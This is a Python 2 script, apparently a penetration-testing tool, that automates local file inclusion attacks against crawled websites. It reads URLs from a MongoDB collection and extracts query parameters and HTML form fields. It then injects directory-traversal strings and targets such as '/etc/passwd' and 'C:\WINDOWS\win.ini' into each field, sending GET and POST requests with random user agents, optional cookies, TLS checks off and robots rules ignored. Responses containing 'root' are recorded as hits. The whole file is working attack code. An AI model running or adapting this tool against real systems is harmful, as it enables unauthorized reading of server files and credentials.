#!/usr/bin/python
# -*- coding: UTF-8 -*-

import mechanize
import requests
import random
import sys
from urlparse import urlparse 
from urlparse import parse_qs
from urlparse import urlunsplit
import timeit
import argparse
import os
import multiprocessing as mp
import time
from pymongo import MongoClient

connection = MongoClient()
db = connection.crwaler # database name

user_agents = ["Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36", \
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1664.3 Safari/537.36", \
                "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36", \
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2", \
                "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0", \
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0", \
                "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))", \
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)"
                ]

def dictToQuery(d):
    query = ""
    for key in d.keys():
        query += str(key) + "=" + str(d[key]) + "&"
    return query[:-1]

# make parameters from html form
def make_parameters(url):
    
    br = mechanize.Browser()
    
    if cookie is None:
        br.addheaders = [('User-agent', random.choice(user_agents))]
        
    else:
        br.addheaders = [('User-agent', random.choice(user_agents)),\
                         ("Cookie", cookie)]
    
    br.set_handle_equiv(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    
    try:
        br.open(url)
        
    except Exception as e:
        return False
    
    method = ""
    action = ""
    result = []
     
    try:
        forms = [f for f in br.forms()]
        
    except Exception as e: 
        return False
    
    if forms == []:
        return False
    
    for form in forms:
        try:
            method = form.method
        except:
            method = "GET"
        
        try:
            action = form.action
            
        except Exception as e: 
            print e
        
        payloads = {}
        method = form.method
        action = form.action
        
        value_number = len(form.controls)
    
        for value in range(value_number):
            try:
                name = str(form.controls[value].name)
            except:
                name = ""
            try:
                value = str(form.controls[value].value)
            except:
                value = ""        
            
            payloads[name] = value
        result.append([payloads, method, action])
        
    return result

            
def save_data(method, case, url, payloads, res):

    report_collection = db["report"]
    
    # should add more intereting strings
    intereting_strings = ["root", "support"]
    
    res_content = res.content

    for intereting_string in intereting_strings:
        if res_content.find(intereting_string) != -1:
            
            # case2 and post
            if payloads:
                
                report_collection.insert({"url" : url,
                                        "attack name" : "lfi",
                                        "method" : method,
                                        "case" : case,
                                        "payload" : payloads,
                                        "res_code" : res.status_code,
                                        "res_length" : len(str(res.content)),
#                                         "res_headers" : str(res.headers)
                                        "res_content" : res.content
#                                         "res_time" : res.elapsed.total_seconds()
                                        })
                print "[+] [%s] %s" %(case, url)
            
            # case1 and get, case2 and get
            else:
                report_collection.insert({"url" : url,
                                        "attack name" : "lfi",
                                        "method" : method,
                                        "case" : case,
                                        "payload" : res.url,
                                        "res_code" : res.status_code,
                                        "res_length" : len(str(res.content)),
#                                         "res_headers" : str(res.headers)
                                        "content" : res.content
#                                         "res_time" : res.elapsed.total_seconds()
                                        })
                print "[+] [%s] %s" %(case, url)
              

def web_request(payloads, method, action, case):
    
    url_scheme = urlparse(action)[0] 
    url_location = urlparse(action)[1] 
        
    action = urlunsplit((url_scheme, url_location, "", "", ""))
    
    if method == "GET" and case == "case1":
        
        try:
            
            if cookie is None:
                
                try:
                    res = requests.get(action, timeout = 1, \
                                       headers = {"User-Agent" : random.choice(user_agents)},\
                                       verify = False,\
                                       params = payloads)
                    
                    save_data(method, case, str(url_location), None, res)

                except (KeyboardInterrupt, SystemExit):
                    
                    connection.close()
                    sys.exit(0) 
                    
                except Exception as e:
                    pass
                
                else:
                    pass
                
            else:
                
                try:
                    res = requests.get(action, timeout = 1,\
                                       headers = {"User-Agent" : random.choice(user_agents),\
                                                  "Cookie" : cookie},\
                                       verify = False,\
                                       params = payloads)
                    
                    save_data(method, case, str(url_location), None, res)
   
                except (KeyboardInterrupt, SystemExit):
                    
                    connection.close()
                    sys.exit(0)
                    
                except Exception as e:
                    pass
                
                else:
                    pass                          
                            
        except Exception as e: 
            print action
            print e
        
    elif method == "GET" and case == "case2":

        try:
            
            if cookie is None:
                
                try:

                    res = requests.get(action, timeout = 1, \
                                       headers = {"User-Agent" : random.choice(user_agents)},\
                                       params = payloads,\
                                       verify = False)
                  
                    save_data(method, case, str(url_location), None, res)
                 
                except (KeyboardInterrupt, SystemExit):
                    
                    connection.close()
                    sys.exit(0)
                    
                except Exception as e:
                    pass
                
                else:
                    pass
                
            else:
                
                try:
                    
                    res = requests.get(action, timeout = 1, \
                                       headers = {"User-Agent" : random.choice(user_agents),\
                                                  "Cookie" : cookie},\
                                       verify = False,\
                                       params = payloads)
                    
                    save_data(method, case, str(url_location), None, res)
                 
                except (KeyboardInterrupt, SystemExit):
                    
                    connection.close()
                    sys.exit(0)
                    
                except Exception as e:
                    pass
                
                else:
                    pass
                             
        except Exception as e: 
            print action
            print e
    
    elif method == "POST" and case == "case3":
                
        try:

            if cookie is None:
                
                try:
                    res = requests.post(action, timeout = 1, \
                                       headers = {"User-Agent" : random.choice(user_agents)},\
                                       data = payloads,\
                                       verify = False)
                    
                    save_data(method, case, str(url_location), None, res)
                    
                except (KeyboardInterrupt, SystemExit):
                    
                    connection.close()
                    sys.exit(0)
                    
                except Exception as e:
                    pass
                
                else:
                    pass
                
            else:
                
                try:
                    res = requests.post(action, timeout = 1, \
                                       headers = {"User-Agent" : random.choice(user_agents),\
                                                  "Cookie" : cookie},\
                                       verify = False,\
                                       data = payloads)
                    
                    save_data(method, case, str(url_location), None, res)
                    
                except (KeyboardInterrupt, SystemExit):
                    
                    connection.close()
                    sys.exit(0)
                    
                except Exception as e:
                    pass
                
                else:
                    pass
                               
        except Exception as e: 
            print action
            print e


def lfi_attack(payloads, method, action, case):
    
    tmp_value = ""
    
    for name in payloads.keys():
        tmp_value = payloads[name]
        
        for attack_commands_a in attack_commands_A:
            
            attack_commands_a = attack_commands_a.decode('utf-8') 

            attack_commands_a = attack_commands_a.strip()

            for attack_commands_b in attack_commands_B:

                attack_commands_b = attack_commands_b.decode('utf-8') 

                attack_commands_b = attack_commands_b.strip()                

                payloads[name] += attack_commands_a
                payloads[name] += attack_commands_b
                
                web_request(payloads, method, action, case)
        
                payloads[name] = tmp_value

def partition(lst, n):
    return [ lst[i::n] for i in xrange(n) ]


def attack_case1(urls, links_to_visit_params):

    # links_to_visit_params will be queue
    for url in urls:
        
        # there are payloads in url
        if urlparse(url)[4]:
            payloads = parse_qs(urlparse(url).query)
               
            # method
            # from {u'action': [u'M01']} to {u'action': u'M01'}
            for name in payloads.keys():
                payloads[name] = payloads[name][0]
            url_with_params = str(urlparse(url)[2]) + str(sorted(payloads.keys()))
                         
            # to reduce duplicate urls
            if url_with_params not in links_to_visit_params:
            
                # case1: there are parameters in url, not action
                lfi_attack(payloads, "GET", url, "case1")
                links_to_visit_params.append(url_with_params)

# form test
def attack_case2(urls, links_to_visit_params):
    
    # links_to_visit_params later to queue
    for url in urls:
       
        results = make_parameters(url)
   
#         if there is no form, it return False 
        if results:
            for result in results:
                 
                # none attr is submit
                payloads = result[0]
                try:
                    del payloads["None"]
                     
                except Exception as e: 
                    pass
                     
                method = result[1]
                action = result[2]
                 
                if method == "GET":
                     
                    url_with_params = str(urlparse(action)[2]) + str(sorted(payloads.keys())) 
                     
                    # to reduce duplicate urls
                    if url_with_params not in links_to_visit_params:
                         
                        lfi_attack(payloads, "GET", action, "case2")
               
                        links_to_visit_params.append(url_with_params)
                         
                         
                elif method == "POST":
                     
                    url_with_params = str(urlparse(action)[2]) + str(sorted(payloads.keys()))
                     
                    # to reduce duplicate urls
                    if url_with_params not in links_to_visit_params:
                         
                        lfi_attack(payloads, "POST", action, "case3")
               
                        links_to_visit_params.append(url_with_params)
                        

def predict_lfi_attack_time():
    
    attack_commands_A_len = len(attack_commands_A)
    attack_commands_B_len = len(attack_commands_B)
    urls = []
    cnt = 0  
    
    for url in collection.find({"res_code" : "200"}, {"url" : 1}):
        urls.append(url["url"])
        
    for url in urls:
        payloads = parse_qs(urlparse(url).query)
        payloads_number = len(payloads.keys())
        cnt += payloads_number
    
    all_count = str(cnt * attack_commands_A_len * attack_commands_B_len * 3)
    estimate_time = str((cnt * attack_commands_A_len * attack_commands_B_len * 0.005))
    # request 하나 당 0.005 ~ 0.01초가 걸리는 듯
    
    print "*" * 120
    print "total attack request will be " + all_count
    print "attack estimate time will be " + estimate_time + " minutes"
    print "*" * 120
    
        
def main():
    
    usage        = '''./local_file_inclusion.py -t google'''
    
    parser = argparse.ArgumentParser(description = "local file inclusion injection for pen testing", \
                                     usage = usage)
    parser.add_argument("-t", "--table", required=True, help="sqlite table name to attack")
    parser.add_argument("-c", "--cookie", required=False, help="filename containing cookie")
    parser.add_argument("-v", "--version", action='version', version = 'JongWon Kim (dikien2012@gmail.com)\n%(prog)s - v.1.0 (04/24/2014)')
    
    args = parser.parse_args()
    
    global cookie
    
    # read cookie from file
    cookie_filename = args.cookie
    
    try:
        f = open(cookie_filename).read()
        cookie = str(f).strip()
        
    except:
        cookie = None
    
    
    global attack_commands_A, attack_commands_B

    try:
#         ex)
#         attack_commands_A = ["", "../../../../../../../../", "..\\..\\..\\..\\..\\..\\..\\"]
#         attack_commands_B = ["C:\WINDOWS\win.ini", "/etc/passwd"]
        attack_commands_A = file("lfi_level_1_a").read()
        attack_commands_A = attack_commands_A.split("\n")
        attack_commands_B = file("lfi_level_1_b").read()
        attack_commands_B = attack_commands_B.split("\n")

    except:
        print "[+] there is no (lfi_level_1_a or lfi_level_1_b) file"
        connection.close()
        sys.exit(0)
        
    global start_time
    start_time = timeit.default_timer()
    
    links_to_visit_params = []

    global table_name 
    table_name = args.table

    global collection 
    collection = db[table_name]

    predict_lfi_attack_time()
    
    ncores = mp.cpu_count()
        
    processes = []
                
# case 1
    urls = [] 

    for url in collection.find({"res_code" : "200"}, {"url" : 1}):
        urls.append(url["url"])
            
    urls = partition(urls, ncores)
     
    for url in urls:
        process = mp.Process(target=attack_case1, args=(url, links_to_visit_params))
        processes.append(process)
        process.start()
         
    for item in processes:
        item.join()

    processes = []
    
# case 2, 3
    urls = [] 

    for url in collection.find({"res_code" : "200"}, {"url" : 1}):
        urls.append(url["url"])
    
    urls = partition(urls, ncores)
    
    for url in urls:
        process = mp.Process(target=attack_case2, args=(url, links_to_visit_params))
        processes.append(process)
        process.start()
         
    for item in processes:
        item.join()             
                             

    end_time = timeit.default_timer()
    
    print "*" * 120
    print '\nlocal file inclusion attack is done: ', end_time - start_time
    print "*" * 120
    connection.close()
    
if __name__ == "__main__":
    main()